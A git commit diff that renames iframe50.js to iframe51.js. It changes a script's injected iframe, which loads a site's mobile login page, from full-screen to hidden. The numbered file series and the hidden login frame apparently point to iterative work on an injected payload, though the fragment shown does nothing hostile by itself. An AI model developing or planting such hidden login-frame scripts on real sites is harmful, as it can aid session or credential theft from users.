603dd402780ab8605253604f17d72f65f9ffbada
MR0Boss <36040218+MR0Boss@users.noreply.github.com>
2025-01-16 01:37:50 -0500

    Update and rename iframe50.js to iframe51.js

--- iframe51.js
+++ iframe51.js
@@ -3,7 +3,8 @@
         var iframe = document.createElement('iframe');
         iframe.src = "/account/login/mobile";
         iframe.id = "loginFrame";
-        iframe.style = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
+        //iframe.style = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
+        iframe.style = "display:none;";
         document.body.appendChild(iframe);
         return iframe;
     }
